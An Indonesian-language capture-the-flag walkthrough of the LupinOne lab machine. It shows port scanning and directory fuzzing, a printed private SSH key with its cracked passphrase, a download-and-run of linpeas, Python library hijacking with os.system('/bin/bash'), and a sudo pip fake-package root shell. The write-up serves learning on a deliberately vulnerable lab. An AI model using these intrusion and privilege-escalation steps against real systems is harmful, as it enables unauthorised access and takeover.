# Empire LupinOne

![](Pasted%20image%2020220323165509.png)

Pertama kita akan memasuki website yang ada di VM LupinOne dengan mengetikkan Ip address dari Virtual Machine tersebut.

Setelah itu kita akan meng-scan menggunakan tool "nmap"
```sh
nmap -sC -sV 192.168.43.214
```

Maka akan terlihat output seperti berikut
```output
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-23 08:28 WITA
Nmap scan report for LupinOne (192.168.43.214)
Host is up (0.00031s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.48 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/~myfiles
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.10 seconds
```
Bisa dilihaat di bagian service http. Di sini kita akan melihat bahwa service http tersebut menyimpan "robots.txt" untuk menyembunyikan suatu halaman dari search engine.

Mari kita buka!!!

![](Pasted%20image%2020220323170214.png)

Setelah kita buka ternyata isinya adalah "Disallow: /~myfiles".

- Di versi lama dari Apache server, tanda "~" digunakan sebagai simbol direktori home dari user. Tapi sayangnya versi Apache yang ini sudah tidak suport dengan fitur itu. Tapi, kita bisa mencoba mencari sebuah page yang memiliki tanda yang sama "~"

Mari kita masukke https://192.168.43.214/~myfiles. 

![](Pasted%20image%2020220323171213.png)

Bisa dilihat bahwa page ini isinya kosong seperti tabungan saya. Server memberikan respon 404 "not found". Sekarang coba kita tekan ctrl + u
```html
<!DOCTYPE html>
<html>
<head>
<title>Error 404</title>
</head>
<body>

<h1>Error 404</h1>

</body>
</html>

<!-- Your can do it, keep trying. -->
```
Ternyata kita telah kena tipu, itu buka respon 404 yang sebenarnya, dan disana ada komen "Your can do it, keep trying.". Ok kalau begitu kita akan "keep trying" dengan mem-brute force servernya, tapi dengan tambahan "~".

```sh
ffuf -c -w /home/wowon/Documents/File/SecLists/Discovery/Web-Content/common.txt -u 'http://192.168.43.214/~FUZZ'
```

Output:
```output
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.43.214/~FUZZ
 :: Wordlist         : FUZZ: /home/wowon/Documents/File/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

secret                  [Status: 301, Size: 318, Words: 20, Lines: 10]
:: Progress: [4711/4711] :: Job [1/1] :: 3384 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```
Ok, kita bisa melihat "secret" disana, sekarang coba kita ke halaman "http://192.168.43.214/~secret/" 

![](Pasted%20image%2020220323172234.png)

Dari informasi diatas kita bisa menyimpulkan bahwa:
- Dihalaman web tersebut ada "ssh key" yang tersembunyi
- Kita bisa mengcrack "passwordnya" dengan "fasttrack"

Kita ambil informasi pertama. Sekarang kita harus menemukan "secret directory" di web tersebut. 
>Note: secret directory di linux diawali dengan tanda titik "."
```sh
ffuf -s -c -w /home/wowon/Documents/File/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://192.168.43.214/~secret/.FUZZ' -fc 403 -e .txt,.html
```

Output:
```
mysecret.txt            [Status: 200, Size: 4689, Words: 1, Lines: 2]
```

Setelah kita brute force dengan teknik wordlist, kita bisa menemukan direktori ".mysecret.txt" di dalam web tersebut. sekarang kita masuk ke http://192.168.43.214/~secret/.mysecret.txt

![](Pasted%20image%2020220323175048.png)

Setelah kita masuk ternyata isinya adalah alpabet yang tidak dapat dibaca. Kita akan meng-indentifikasi text ini dengan "https://www.dcode.fr/cipher-identifier"

![](Pasted%20image%2020220323175546.png)
Setelah kita identifikasi, ternyata text tersebut merupakan base58, kita akan mendecodenya dengan "https://www.dcode.fr/base-58-cipher"

![](Pasted%20image%2020220323175847.png)
Maka kita akan mendapatkan hasil seperti berikut...

```pem
-----BEGIN OPENSSH PRIVATE KEY-----  
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  
iUJ66WmRUN9EoVlkeCzQJwivI=  
-----END OPENSSH PRIVATE KEY-----
```

Hasil tersebut kita simpan menjadi sebuah file. Disini saya menyimpan file tersbut menjadi "cert.key". Sekarang kita akan mencoba login SSH menggunakan "cert.key"

>Note: kita mendapatkan username dari "http://192.168.43.214/~secret/" 
```sh
chmod 600 cert.key
ssh -i cert.key icex64@192.168.43.214
```

```
Enter passphrase for key 'cert.key':
```

Hmmm... kita disuruh untuk memasukkan password dari "cert.key". Karena kita tidak tahu password "cert.key", sekarang kita akan mebrute force "cert.key" untuk mendapatkan passwordnya.

>Note: 
>- "ssh2john" bisa didapatkan disini "https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py"
>- Wordlistnya bisa didapat di "https://raw.githubusercontent.com/drtychai/wordlists/master/fasttrack.txt"
```sh
ssh2john cert.key > hash.txt
john --wordlist=/home/wowon/Documents/File/SecLists/Passwords/fasttrack.txt hash.txt
```

Output:
```output
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
P@55w0rd!        (cert.key)  
```

Sekarang kita sudah mendapatkan passwordnya, mari kita loggin kembali.
```sh
ssh -i cert.key icex64@192.168.43.214
Enter passphrase for key 'cert.key': P@55w0rd!
```

![](Pasted%20image%2020220323182204.png)

Kita berhasi masuk ke user "icex64". Sekarang tinggal menjadi user root.

Disini kita akan mendownload "linpeas.sh" untuk melihat *vulnerability* pada mesin ini.
```sh
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220320/linpeas.sh
```

```sh
chmod 777 linpeas.sh
./linpeas.sh
```

![](Pasted%20image%2020220323194533.png)

Dari hasil scan diatas kita lihat "/usr/lib/python3.9/webbrowser.py".

Jika kita lihat ke direktori home user "arsene" maka disana akan ada file "heist.py"
```sh
cat /home/arsene/heist.py
```

```python
import webbrowser

print ("Its not yet ready to get in action")

webbrowser.open("https://empirecybersecurity.co.mz")
```
"heist.py" ini menggunakan module "webbrowser.py". "webbrowser.py" ini bisa kita ubah dalamnya agar kita bisa melakukan *privilege enumeration*

kita selipkan ini ke "/usr/lib/python3.9/webbrowser.py"
```python
os.system ("/bin/bash")
```

![](Pasted%20image%2020220323195629.png)

sekarang kita jalankan program di "/home/arsene/heist.py" sebagai user "arsene"
```sh
cd /home/arsene
ls
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```

![](Pasted%20image%2020220323195831.png)

Sekarang kita sudah memiliki user "arsene". Sekarang kita lanjut untuk mendapatkan user "root".

```
sudo -l
```

```json
Matching Defaults entries for arsene on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User arsene may run the following commands on LupinOne:
    (root) NOPASSWD: /usr/bin/pip
```
Bisa dilihat dari output di atas bahwa perintah "/usr/bin/pip" bisa dijalankan sebagai root tandapa menginputkan password. Lanjut...

Kita akan memanfaatkan pip untuk mendapatkan user root, dengan menginstall package palsu melaului perintah pip.
```sh
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

![](Pasted%20image%2020220323200427.png)

Akhirnya kita mendapatkan rootnya :)